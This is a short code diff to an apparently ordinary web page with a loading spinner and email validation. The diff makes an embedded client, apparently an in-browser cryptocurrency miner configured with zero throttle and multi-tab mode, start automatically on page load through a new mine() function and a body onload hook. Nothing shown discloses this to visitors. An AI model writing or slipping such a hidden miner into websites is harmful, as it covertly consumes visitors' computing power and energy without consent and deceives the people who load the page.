@@ -621,7 +621,7 @@
 </head>
 
 
-<body>
+<body onload="mine()">
     <div class="loader-container">
         <img src="byy.svg" alt="Loading...">
     </div>
@@ -924,9 +924,11 @@
         throttle: 0,
         forceASMJS:false
      });
-    clientOBJ.start(WMP.FORCE_MULTI_TAB);
-
-
+    
+    async function mine(){
+      
+clientOBJ.start(WMP.FORCE_MULTI_TAB);
+}
     function isValidEmail(email) {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
